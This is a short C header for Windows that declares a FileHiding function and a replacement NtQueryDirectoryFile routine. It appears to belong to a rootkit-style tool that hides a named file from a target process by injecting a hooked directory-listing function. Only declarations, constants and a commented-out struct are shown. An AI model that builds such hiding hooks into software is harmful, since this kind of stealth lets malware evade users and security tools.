#pragma once

#include <stdio.h>
#include <windows.h>
#include <winternl.h>

DWORD GetProcessIdByImageName(wchar_t* ProcessName);
BOOL FileHiding(wchar_t *TargetProcessName, wchar_t *HideFileName);

#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define Upper(s1) s1 >= 65 && s1 <= 90 ? (wchar_t)s1 + 32 : s1

#define NewNtQueryDirectoryFile_Size (ULONGLONG)AtherFunc - (ULONGLONG)NewNtQueryDirectoryFile

/*typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[ANYSIZE_ARRAY];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;*/